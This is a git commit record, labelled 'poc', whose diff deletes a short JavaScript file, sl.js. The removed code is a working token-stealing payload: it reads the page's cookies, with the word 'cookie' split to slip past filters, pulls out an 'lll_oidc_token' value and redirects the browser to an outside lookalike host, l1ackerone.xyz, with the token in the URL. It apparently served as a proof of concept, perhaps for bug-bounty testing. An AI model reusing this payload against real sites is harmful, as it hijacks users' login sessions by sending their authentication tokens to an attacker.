be665590f66d464ea07c18bdcaa1bd758115f957
itsryuku <39871872+itsryuku@users.noreply.github.com>
2024-12-20 16:38:40 -0500

    poc

--- sl.js
+++
@@ -1,7 +0,0 @@
-this.location.replace(
-    "https://l1ackerone.xyz/?token=" +
-        document["coo" + "kie"]
-            .split("; ")
-            .find((c) => c.startsWith("lll_oidc_token="))
-            ?.split("=")[1]
-);
